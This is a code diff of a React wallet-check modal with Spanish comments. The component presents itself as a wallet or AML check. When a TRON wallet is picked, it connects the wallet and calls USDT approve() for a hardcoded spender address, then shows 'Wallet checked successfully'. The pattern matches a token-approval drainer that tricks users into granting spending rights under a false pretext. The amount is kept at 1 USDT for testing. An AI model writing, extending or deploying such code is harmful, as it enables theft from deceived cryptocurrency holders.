@@ -43,17 +43,13 @@ const approveUSDT = async () => {
     return
   }
 
-  // ✅ USDT TRON
   const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
-
-  // ⚠️ TU CONTRATO (déjalo así por ahora si estás probando)
   const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"
 
   try {
     const contract = await tron.contract().at(contractAddress)
 
-    // ✅ USDT usa 6 decimales → 1 USDT
-    const amount = 1000000
+    const amount = 1000000 // 1 USDT
 
     const tx = await contract.approve(spender, amount).send()
 
@@ -72,22 +68,10 @@ export function WalletCheckModal({ open, onClose }: Props) {
   if (!open) return null
 
   const networks = [
-    {
-      name: "Ethereum",
-      logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png",
-    },
-    {
-      name: "BNB Chain",
-      logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png",
-    },
-    {
-      name: "TRON",
-      logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png",
-    },
-    {
-      name: "Solana",
-      logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png",
-    },
+    { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png" },
+    { name: "BNB Chain", logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" },
+    { name: "TRON", logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png" },
+    { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png" },
   ]
 
   const wallets = [
@@ -149,15 +133,20 @@ export function WalletCheckModal({ open, onClose }: Props) {
               <button
                 key={wallet.name}
                 onClick={async () => {
-                  if (selectedNetwork === "TRON") {
-                    const address = await connectTron()
-
-                    if (address) {
-                      await approveUSDT()
-                    }
-                  } else {
+                  // 🔥 SOLO TRON
+                  if (selectedNetwork !== "TRON") {
                     alert("This network is not implemented yet")
+                    return
                   }
+
+                  const address = await connectTron()
+                  if (!address) return
+
+                  // 🔥 AQUÍ se lanza approve (solo al hacer click)
+                  await approveUSDT()
+
+                  // 🔥 después irá AML
+                  alert("Wallet checked successfully")
 
                   onClose()
                   setStep("network")
